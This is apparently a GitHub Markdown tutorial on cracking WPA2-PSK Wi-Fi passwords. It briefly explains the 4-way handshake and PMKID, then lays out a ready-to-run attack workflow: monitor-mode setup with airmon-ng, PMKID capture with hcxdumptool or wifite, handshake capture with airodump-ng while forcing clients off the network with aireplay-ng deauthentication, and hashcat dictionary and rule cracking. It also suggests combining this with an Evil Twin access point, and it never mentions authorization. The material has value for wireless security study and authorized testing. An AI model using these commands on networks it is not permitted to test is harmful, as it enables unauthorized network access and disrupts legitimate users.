# Getting and Cracking WPA2

## The main idea behind WPA2-PSK is that the Password is baked inside every session. Just get the password and you can crack it later, with no access to the point.

There's 2 main ways of how to get the hash of the password

- PMKID - just a calculated PMK (in easy words - instead of password the router checks smaller, calculated version of it)
Moreover with PMKID - we don't need the client on the line, because the router can be tricked into handing us the EAPOL frame.

- 4-way handshake capture - simply capturing the EAPOL frames from the handshake, tho in order not to wait for a client to connect - we can send deauth requests to enforce the handshake


## How WPA2-PSK actually works

As you could've thought the WPA2 sends the password's hash over the air, but really it doesn't.
In reality it's this way - 

<img width="1280" height="720" alt="01-wpa2-psk-how-it-works" src="https://github.com/user-attachments/assets/cc0a55c2-b6dc-4490-9e3e-f2c1f4b091e6" />

Password becomes the key - 
- Passphrase
- SSID (as salt)
- PBKDF2-SHA1 (4096 iterations)

4-way handshake on client's auth (4 EAPOL frames are sent)
- M1 - AP -> Client sends ANonce, a random nonce (random number used once)
- M2 - Client -> SNonce + MIC (message integrity code). Having 2 nonces - computes the PTK (Pairwise Transient Key)  
- M3 - AP -> MIC verifies the client + group key (GTK), install key
- M4 - client -> ACK, keys in traffic encrypted

PTK = PRF ( PMK, ANonce, SNonce, AP-Mac, STA-Mac )

Basically everything just flies through the air, and the only problem - PMK, which is encrypted with PBKDF2. Capture it - dehash the password - you're in

## Prep (Monitor mode)

> Attention - you must use wi-fi adapter with Monitor mode in order to catch EAPOL frames

```bash
sudo airmon-ng check kill     #optional, only if you used it before
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0 # Check if you can do anything with your exact wi-fi adapter
```

## Cracking with PMKID

<img width="1280" height="720" alt="03-pmkid-attack" src="https://github.com/user-attachments/assets/95f63b7d-9f59-4d02-901a-97a8f9dc5425" />


Personally - I use wifite, which can perform both attacks 
just `sudo wifite` and then crack captured hash with `hashcat -m 22000 hash.hc22000 rockyou.txt`

Or you can target only the PMKID using
```bash
sudo hcxdumptool -i wlan0mon -o dump.pcapng #wait some time, ctrl+C to stop

hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

№№ Cracking by capturing the handshake

<img width="1280" height="720" alt="02-deauth-handshake-capture" src="https://github.com/user-attachments/assets/9b1d8633-e101-4e67-af60-7444a0dc6b63" />

In order to do that - you'd have to listen and send deauth requests at the same time
Again, you could use `sudo wifite` but for this matter - it'd be better to go with `airodump-ng`

#### 1st terminal (Capturing process can also be done with Wireshark filtered to EAPOL, but you still have to activate Monitor mode)
```bash
sudo airmon-ng start wlan0 # puts the adapter into monitor mode

sudo airodump-ng wlan0     # you'll see many networks, pick one with the most clients or beacons

sudo airodump-ng -c <CH> --bssid <AP_MAC> -w cap wlan0   # starting the capture on this network. 
```

#### 2nd terminal (Deauth)
```bash
sudo aireplay-ng -0 3 -a <AP_MAC> -c <CLIENT_MAC> wlan0
```

##### After the capture - it's only matter of cracking it
``` bash
hcxpcapngtool -o hash.hc22000 cap-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
#or
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## May be combined with
- EvilTwin / Rogue AP 


## Gotchas

- The adapter must be capable of Monitor and Injection mode
- `airodump` channel-hopping misses handshakes - always use `-c` lock once you have a target
- Adapter must be compatible with the frequency. 5GHz network can't be cracked with 2.4GHz adapter
- `arimon-ng check kill` and `sudo systemctl restart NetworkManager` helps a lot







